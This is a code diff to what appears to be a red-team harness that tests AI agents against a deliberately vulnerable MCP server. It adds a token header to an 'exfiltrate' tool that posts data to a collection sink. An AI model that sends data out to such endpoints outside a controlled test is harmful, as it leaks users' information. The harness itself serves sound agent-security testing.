@@ -32,6 +32,8 @@ ACTION: <tool_name> <json-args>
 
 MCP_URL = os.environ.get("REDSEC_URL_VULN_MCP", "http://127.0.0.1:9070").rstrip("/")
 DROP_URL = os.environ.get("REDSEC_DROP_URL")
+# Marks this target's sink posts as genuine (see redsec/services/drop).
+DROP_HEADERS = {"X-RedSec-Drop-Token": os.environ.get("REDSEC_DROP_TOKEN", "")}
 SELF_URL = os.environ.get(
     "REDSEC_URL_HOST", f"http://127.0.0.1:{os.environ.get('REDSEC_PORT', '9071')}"
 ).rstrip("/")
@@ -116,7 +118,7 @@ def _exec(name: str, args: dict) -> str:
     if name == "exfiltrate":
         if DROP_URL:
             try:
-                httpx.post(f"{DROP_URL}/collect/host",
+                httpx.post(f"{DROP_URL}/collect/host", headers=DROP_HEADERS,
                            json={"body": args.get("body", "")}, timeout=5)
             except Exception:
                 pass
